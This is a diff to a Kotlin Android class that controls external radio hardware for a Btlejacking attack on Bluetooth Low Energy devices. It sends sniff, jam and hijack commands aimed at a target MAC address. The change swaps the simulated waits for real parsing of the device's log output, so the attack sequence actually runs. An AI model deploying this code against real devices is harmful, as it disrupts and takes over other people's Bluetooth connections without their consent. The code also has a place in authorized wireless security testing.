@@ -1,22 +1,24 @@
 package com.hereliesaz.blusnu.data
 
+import android.util.Log
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
-import kotlinx.coroutines.delay
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.asStateFlow
+import kotlinx.coroutines.flow.first
 import kotlinx.coroutines.launch
+import kotlinx.coroutines.withTimeoutOrNull
 
 /**
  * Enum representing the various states of a Btlejacking attack lifecycle.
  */
 enum class BtlejackingState {
-    IDLE,       // No active attack.
-    SNIFFING,   // Hardware is sniffing for a new connection.
-    JAMMING,    // Hardware is jamming the existing connection to force disconnect.
-    HIJACKING,  // Hardware is attempting to take over the connection using sniffed parameters.
-    CONNECTED   // Hijack successful, we own the connection.
+    IDLE,
+    SNIFFING,
+    JAMMING,
+    HIJACKING,
+    CONNECTED
 }
 
 /**
@@ -27,38 +29,53 @@ enum class BtlejackingState {
  * standard Bluetooth chips cannot perform the required sniffing and precise jamming.
  *
  * This class acts as the controller for that external hardware, sending commands
- * via the [HardwareManager].
+ * via the [HardwareManager] and parsing real output to determine phase transitions.
  *
  * @property hardwareManager Interface to the external radio hardware.
  */
 class BtlejackingModule(private val hardwareManager: HardwareManager) {
 
-    // Internal state flow to track the attack progress.
+    companion object {
+        private const val TAG = "BtlejackingModule"
+        private const val SNIFF_TIMEOUT_MS = 30_000L
+        private const val JAM_TIMEOUT_MS = 10_000L
+        private const val HIJACK_TIMEOUT_MS = 10_000L
+    }
+
     private val _state = MutableStateFlow(BtlejackingState.IDLE)
-    // Exposed immutable state flow for UI observation.
     val state = _state.asStateFlow()
 
-    // Scope for background operations.
     private val scope = CoroutineScope(Dispatchers.IO + Job())
-    // Handle to the current attack job, allowing cancellation.
     private var attackJob: Job? = null
 
     /**
      * Phase 1: Start sniffing for the target device's connection.
+     *
+     * Sends the sniff command to hardware and waits for the "locked" keyword
+     * in the device output, with a timeout.
      *
      * @param target The device to target.
      */
     fun startSniffing(target: TargetDevice) {
         attackJob = scope.launch {
             _state.value = BtlejackingState.SNIFFING
-            // Send the low-level command to the hardware dongle.
-            // "sniff -t [MAC]" tells BtleJack to follow this specific advertiser.
             hardwareManager.sendCommand("sniff -t ${target.macAddress}")
 
-            // Wait for the hardware to lock onto a connection.
-            delay(5000) // Simulate sniffing duration/wait for lock.
+            // Wait for hardware to report lock-on, with timeout
+            val locked = withTimeoutOrNull(SNIFF_TIMEOUT_MS) {
+                hardwareManager.deviceLogs.first { logLine ->
+                    logLine.contains("locked", ignoreCase = true) ||
+                    logLine.contains("synchronized", ignoreCase = true) ||
+                    logLine.contains("connection found", ignoreCase = true)
+                }
+            }
 
-            // If still in SNIFFING state (not cancelled), proceed to Phase 2.
+            if (locked == null) {
+                _state.value = BtlejackingState.IDLE
+                Log.w(TAG, "Sniffing timed out without locking onto a connection.")
+                return@launch
+            }
+
             if (_state.value == BtlejackingState.SNIFFING) {
                 startJamming()
             }
@@ -67,15 +84,28 @@ class BtlejackingModule(private val hardwareManager: HardwareManager) {
 
     /**
      * Phase 2: Jam the connection to force a supervision timeout.
+     *
+     * Sends the jam command and waits for the hardware to confirm
+     * the connection has been disrupted.
      */
     private suspend fun startJamming() {
         _state.value = BtlejackingState.JAMMING
-        // "jam" command tells hardware to emit noise on the active channels at the specific access address time slots.
         hardwareManager.sendCommand("jam")
 
-        delay(3000) // Simulate jamming duration.
+        val jammed = withTimeoutOrNull(JAM_TIMEOUT_MS) {
+            hardwareManager.deviceLogs.first { logLine ->
+                logLine.contains("jammed", ignoreCase = true) ||
+                logLine.contains("disconnected", ignoreCase = true) ||
+                logLine.contains("timeout", ignoreCase = true)
+            }
+        }
 
-        // If still in JAMMING state, proceed to Phase 3.
+        if (jammed == null) {
+            _state.value = BtlejackingState.IDLE
+            Log.w(TAG, "Jamming timed out without disrupting the connection.")
+            return
+        }
+
         if (_state.value == BtlejackingState.JAMMING) {
             startHijacking()
         }
@@ -83,20 +113,31 @@ class BtlejackingModule(private val hardwareManager: HardwareManager) {
 
     /**
      * Phase 3: Hijack the connection.
+     *
      * The legitimate central has disconnected due to jamming.
-     * The attacker takes its place using the sniffed parameters (Access Address, CRCInit, HopInterval).
+     * The attacker takes its place using the sniffed parameters
+     * (Access Address, CRCInit, HopInterval).
      */
     private suspend fun startHijacking() {
         _state.value = BtlejackingState.HIJACKING
-        // "hijack" command initiates the takeover.
         hardwareManager.sendCommand("hijack")
 
-        delay(2000) // Simulate hijacking duration.
+        val hijacked = withTimeoutOrNull(HIJACK_TIMEOUT_MS) {
+            hardwareManager.deviceLogs.first { logLine ->
+                logLine.contains("hijacked", ignoreCase = true) ||
+                logLine.contains("connected", ignoreCase = true) ||
+                logLine.contains("takeover", ignoreCase = true)
+            }
+        }
 
-        // If still in HIJACKING state, assume success.
+        if (hijacked == null) {
+            _state.value = BtlejackingState.IDLE
+            Log.w(TAG, "Hijacking timed out without taking over the connection.")
+            return
+        }
+
         if (_state.value == BtlejackingState.HIJACKING) {
             _state.value = BtlejackingState.CONNECTED
-            // Notify hardware we are in control.
             hardwareManager.sendCommand("connected")
         }
     }
@@ -105,12 +146,10 @@ class BtlejackingModule(private val hardwareManager: HardwareManager) {
      * Stops any active attack and resets the hardware.
      */
     fun stop() {
-        // Cancel the coroutine job to stop the state transitions.
         attackJob?.cancel()
 
         scope.launch {
             _state.value = BtlejackingState.IDLE
-            // Reset the hardware dongle.
             hardwareManager.sendCommand("stop")
         }
     }
